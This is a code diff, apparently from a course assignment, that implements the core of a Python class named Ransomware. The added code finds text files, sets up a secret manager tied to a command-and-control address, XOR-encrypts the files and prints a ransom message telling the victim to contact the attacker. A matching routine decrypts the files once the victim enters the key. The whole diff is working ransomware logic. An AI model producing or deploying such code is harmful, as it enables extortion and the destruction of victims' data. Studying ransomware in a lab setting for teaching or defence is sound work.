@@ -36,15 +36,59 @@ class Ransomware:
 
     def get_files(self, filter:str)->list:
         # return all files matching the filter
-        raise NotImplemented()
+        path = Path('.')
+        return list(path.glob(filter))
 
     def encrypt(self):
         # main function for encrypting (see PDF)
-        raise NotImplemented()
+        files_encr = self.get_files("*.txt")
+
+        # creation of the secret manager
+        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
+
+        # call to the setup function
+        secret_manager.setup()
+
+        # Encryption of files
+        secret_manager.xorfiles(files_encr)
+
+        # Displays a message asking the victim to contact the attacker
+
+        hex_token = secret_manager.get_hex_token()
+        print(ENCRYPT_MESSAGE.format(token=hex_token))
 
     def decrypt(self):
         # main function for decrypting (see PDF)
-        raise NotImplemented()
+        secret_manager = SecretManager(CNC_ADDRESS,TOKEN_PATH)
+
+        # Load local cryptographic elements
+        secret_manager.load()
+
+        # List all the texte files
+        files_decr = self.get_files("*.txt")
+
+        while True:
+            try:
+                # Request the decryption key
+                Applicant_key = input("Enter the key to decrypt your files: ")
+
+                # Define the key
+                secret_manager.set_key(Applicant_key)
+
+                # Calling xorfiles function to decrypt files
+                secret_manager.xorfiles(files_decr)
+
+                # Call of the clean function
+                secret_manager.clean()
+
+                # the decryption was successful
+                print("Decryption successful!")
+
+                # Exit ransomware
+                break
+            except ValueError:
+                # Error Message Display
+                print("Invalid key.")
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
